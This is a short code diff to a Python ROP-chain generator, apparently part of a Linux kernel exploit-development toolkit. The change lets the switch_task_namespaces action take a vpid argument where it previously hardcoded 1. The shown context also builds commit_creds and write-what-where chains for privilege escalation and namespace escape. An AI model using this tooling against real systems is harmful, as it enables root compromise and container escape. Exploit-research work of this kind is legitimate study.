@@ -283,7 +283,7 @@ class RopGeneratorAngrop:
 
         return RopChain(items)
 
-    def rop_action_switch_task_namespaces(self):
+    def rop_action_switch_task_namespaces(self, vpid: RopChainConstant | RopChainArgument):
         """Constructs a ROP action to call fswitch_task_namespaces.
 
         Returns:
@@ -291,7 +291,7 @@ class RopGeneratorAngrop:
         """
         items = [
             RopChainOffset(self._find_pop_one_reg("rdi")),
-            RopChainConstant(1),
+            vpid,
             self._find_symbol(FIND_TASK_BY_VPID),
         ]
 
@@ -366,7 +366,7 @@ if __name__ == "__main__":
     print("sleep\n" + repr(action_sleep) + '\n\n')
     action_commit_creds = rop_generator.rop_action_commit_creds()
     print("Commit Creds\n" + repr(action_commit_creds) + '\n\n')
-    action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces()
+    action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces(RopChainConstant(1))
     print("Switch task Namepspace\n" +
           repr(action_switch_task_namespace) + '\n\n')
     action_write_what_where_64 = rop_generator.rop_action_write_what_where_64(
